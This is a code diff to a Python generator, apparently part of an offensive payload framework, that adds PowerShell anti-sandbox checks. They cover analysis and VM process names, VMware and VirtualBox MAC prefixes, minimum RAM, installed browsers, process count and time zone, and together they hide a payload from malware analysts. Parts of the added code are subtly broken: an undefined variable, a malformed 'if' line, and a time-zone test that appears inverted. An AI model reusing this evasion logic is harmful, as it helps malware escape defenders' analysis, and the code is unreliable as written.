@@ -391,6 +391,90 @@ def senecas_games(evasion_payload):
             check_code += "if($env:computername -eq \"" + evasion_payload.required_options["HOSTNAME"][0].lower() + "\") {\n"
             num_tabs_required += 1
 
+        if evasion_payload.required_options["UTCCHECK"][0].lower() != "false":
+
+            standard_time_zone = evasion_helpers.randomString()
+            daylight_time_zone = evasion_helpers.randomString()
+
+            check_code += "$" + standard_time_zone + ' = [System.TimeZone]::CurrentTimeZone.StandardName\n'
+            check_code += "$" + daylight_time_zone + ' = [System.TimeZone]::CurrentTimeZone.DaylightName\n'
+            check_code += "if ($" + standard_time_zone + ' -eq "Coordinated Universal Time" -or $' + daylight_time_zone + ' -eq "Coordinated Universal Time") {\n'
+            num_tabs_required += 1
+
+        if evasion_payload.required_options["MINRAM"][0].lower() != "false":
+            check_code += "if ((Get-Ciminstance Win32_OperatingSystem).TotalVisibleMemorySize/1048576 -gt 3) {\n"
+            num_tabs_required += 1
+
+        if evasion_payload.required_options["VIRTUALPROC"][0].lower() != "false":
+
+            evidenceof_sandbox = evasion_helpers.randomString()
+            sandbox_processes = evasion_helpers.randomString()
+            running_processes = evasion_helpers.randomString()
+            running_proc = evasion_helpers.randomString()
+            sandbox_proc = evasion_helpers.randomString()
+
+            check_code += '$' + evidenceof_sandbox + ' = New-Object System.Collections.ArrayList\n'
+            check_code += '$' + sandbox_processes + ' = "vmsrvc", "tcpview", "wireshark","visual basic", "fiddler", "vmware", "vbox", "process explorer", "autoit", "vboxtray", "vmtools", "vmrawdsk", "vmusbmouse", "vmvss", "vmscsi", "vmxnet", "vmx_svga", "vmmemctl", "df5serv", "vboxservice", "vmhgfs"\n'
+            check_code += '$' + running_processes + ' = Get-Process\n'
+            check_code += 'ForEach ($' + running_proc + ' in $' + running_processes + ') {\n'
+            check_code += '\tForEach ($' + sandbox_proc + ' in $' + sandbox_processes + ') {\n'
+            check_code += '\t\tif ($' + running_proc + '.ProcessName | Select-String $' + sandbox_proc + ') {\n'
+            check_code += '\t\t\tif ($' + evidenceof_sandbox + ' -NotContains $' + running_proc+ '.ProcessName) {\n'
+            check_code += '\t\t\t\t[void]$' + evidenceof_sandbox + '.Add($' + running_proc + '.ProcessName)\n'
+            check_code += '\t\t\t}\n'
+            check_code += '\t\t}\n'
+            check_code += '\t}\n'
+            check_code += '}\n'
+            check_code += 'if ($' + evidenceof_sandbox + '.count -eq 0) {\n'
+            num_tabs_required += 1
+
+        if evasion_payload.required_options["MINBROWSERS"][0].lower() != "false":
+
+            browser_count = evasion_helpers.randomString()
+            browser_keys = evasion_helpers.randomString()
+            browser_key = evasion_helpers.randomString()
+
+            check_code += '$' + browser_count + ' = 0\n'
+            check_code += '$' + browser_keys + " = 'SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe', 'SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\iexplore.exe', 'SOFTWARE\Mozilla'\n"
+            check_code += 'ForEach ($' + browser_key + ' in $' + browser_keys + ') {\n'
+            check_code += '\tif (Test-Path ("HKLM:\" + $' + browser_key + ')) {\n'
+            check_code += '\t\t++$' + browser_count + '\n'
+            check_code += '\t}\n'
+            check_code += '}\n'
+            check_code += 'if ($' + browser_count + ' -ge 2) {\n'
+            num_tabs_required += 1
+
+        if evasion_payload.required_options["BADMACS"][0].lower() != "false":
+
+            sand_macs = evasion_helpers.randomString()
+            bad_macs = evasion_helpers.randomString()
+            current_macs = evasion_helpers.randomString()
+            mac_addy = evasion_helpers.randomString()
+            badmac_addy = evasion_helpers.randomString()
+
+            check_code += '$' + sand_macs + ' = New-Object System.Collections.ArrayList\n'
+            check_code += '$' + bad_macs + " = '00:0C:29', '00:1C:14', '00:50:56', '00:05:69', '08:00:27'\n"
+            check_code += '$' + current_mac + ' = Get-WmiObject Win32_NetworkAdapterConfiguration | Select -ExpandProperty MACAddress\n'
+            check_code += 'ForEach ($' + mac_addy + ' in $' + current_macs + ') {\n'
+            check_code += '\tForEach ($' + badmac_addy + ' in $' + bad_macs + ') {\n'
+            check_code += '\t\tif ($' + mac_addy + ' | Select-String $' + badmac_addy + ') {\n'
+            check_code += '\t\t\t[void]$' + sand_macs + '.Add($' + mac_addy + ')\n'
+            check_code += '\t\t}\n'
+            check_code += '\t}\n'
+            check_code += '}\n'
+            check_code += 'if $' + sand_macs + '.count -eq 0) {\n'
+            num_tabs_required += 1
+
+        if evasion_payload.required_options["MINPROCESSES"][0].lower() != "x":
+
+            minimum_processes = evasion_helpers.randomString()
+            running_procs = evasion_helpers.randomString()
+
+            check_code += '$' + minimum_processes + ' = ' + evasion_payload.required_options["MINPROCESSES"][0] + '\n'
+            check_code += '$' + running_procs + ' = (Get-Process).count\n'
+            check_code += 'if ($' + running_procs + ' -ge $' + minimum_processes + ') {\n'
+            num_tabs_required += 1
+
         if evasion_payload.required_options["DOMAIN"][0].lower() != "x":
             check_code += "if((Get-WMIObject -Class Win32_ComputerSystem).Domain -eq \"" + evasion_payload.required_options["DOMAIN"][0].lower() + "\") {\n"
             num_tabs_required += 1
